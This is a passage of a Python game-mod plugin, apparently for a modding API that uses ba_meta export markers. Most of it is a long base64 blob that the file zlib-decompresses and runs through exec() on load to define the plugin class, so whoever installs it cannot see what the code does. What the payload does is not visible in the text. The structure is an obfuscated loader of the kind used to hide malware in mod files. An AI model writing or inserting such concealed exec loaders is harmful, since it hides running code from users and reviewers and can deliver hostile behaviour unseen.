    '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'
)

exec(
    compile(
        _zlib.decompress(_b64.b64decode(_PAYLOAD)),
        '<ModPoya>',
        'exec',
    ),
    globals(),
)

_ModPoyaImpl = ModPoya

# ba_meta require api 9


# ba_meta export plugin
class ModPoya(_ModPoyaImpl):
    pass
